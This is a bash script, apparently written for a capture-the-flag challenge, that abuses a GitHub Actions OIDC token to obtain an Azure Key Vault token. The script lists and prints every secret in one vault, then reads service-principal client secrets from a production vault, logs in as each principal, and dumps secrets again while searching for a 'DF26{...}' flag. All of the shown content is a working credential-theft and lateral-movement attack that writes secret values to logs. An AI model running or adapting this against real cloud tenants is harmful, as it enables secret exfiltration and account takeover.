#!/usr/bin/env bash
set -uo pipefail
M="--max-time 30 --connect-timeout 10"
PRODKV="https://kv-tbl-prod-x3euoz.vault.azure.net"
SECKV="https://kv-tbl-sec-x3euoz.vault.azure.net"

OIDC=$(curl -sS $M -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r '.value')
KV=$(curl -sS $M -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" -d "client_id=$AZURE_CLIENT_ID" -d "scope=https://vault.azure.net/.default" -d "grant_type=client_credentials" -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" -d "client_assertion=$OIDC" | jq -r '.access_token // empty')
echo "pipeline vault token len=${#KV}"

# try reading all of kv-tbl-sec with a given vault token; grep DF26 in values
probe_sec () {
  local label="$1" tok="$2"
  [ -z "$tok" ] && { echo "[$label] NO TOKEN"; return; }
  local list; list=$(curl -sS $M -H "Authorization: Bearer $tok" "$SECKV/secrets?api-version=7.4&maxresults=25")
  local code; code=$(printf '%s' "$list" | jq -r 'if .error then "ERR:"+.error.code else "OK" end' 2>/dev/null)
  if [ "$code" != "OK" ]; then echo "[$label] kv-tbl-sec list -> $(printf '%s' "$list" | jq -c '.error' 2>/dev/null | head -c 160)"; return; fi
  echo "[$label] kv-tbl-sec LIST OK:"
  local ids; ids=$(printf '%s' "$list" | jq -r '.value[]?.id')
  echo "$ids" | sed 's/^/   /'
  while IFS= read -r sid; do
    [ -z "$sid" ] && continue
    local v; v=$(curl -sS $M -H "Authorization: Bearer $tok" "$sid?api-version=7.4" | jq -r '.value // empty')
    echo "   VAL $sid = $v"
    printf '%s' "$v" | grep -aoE "DF26\{[^}]*\}" && echo "   *** FLAG ABOVE ***"
  done <<< "$ids"
}

echo "=== pipeline SP vs kv-tbl-sec ==="
probe_sec "pipeline" "$KV"

for name in cost-reader-principal directory-audit-principal reporting-service-principal reporting-viewer-principal secrets-sync-principal sync-service-principal; do
  J=$(curl -sS $M -H "Authorization: Bearer $KV" "$PRODKV/secrets/$name?api-version=7.4" | jq -r '.value // empty')
  [ -z "$J" ] && { echo "=== $name: could not read principal secret ==="; continue; }
  appId=$(printf '%s' "$J" | jq -r '.appId // .clientId // .client_id // .appid // empty' 2>/dev/null)
  sec=$(printf '%s'   "$J" | jq -r '.clientSecret // .password // .secret // .client_secret // empty' 2>/dev/null)
  ten=$(printf '%s'   "$J" | jq -r '.tenant // .tenantId // .tenant_id // empty' 2>/dev/null)
  [ -z "$ten" ] && ten=$AZURE_TENANT_ID
  if [ -z "$appId" ] || [ -z "$sec" ]; then
    echo "=== $name: shape not {appId,clientSecret}; raw keys: $(printf '%s' "$J" | jq -rc 'keys' 2>/dev/null) ==="
    continue
  fi
  tok=$(curl -sS $M -X POST "https://login.microsoftonline.com/$ten/oauth2/v2.0/token" -d "client_id=$appId" -d "client_secret=$sec" -d "scope=https://vault.azure.net/.default" -d "grant_type=client_credentials" | jq -r '.access_token // empty')
  echo "=== $name (appId=$appId) vault-token len=${#tok} ==="
  probe_sec "$name" "$tok"
done
echo "KVSEC DONE"; exit 0
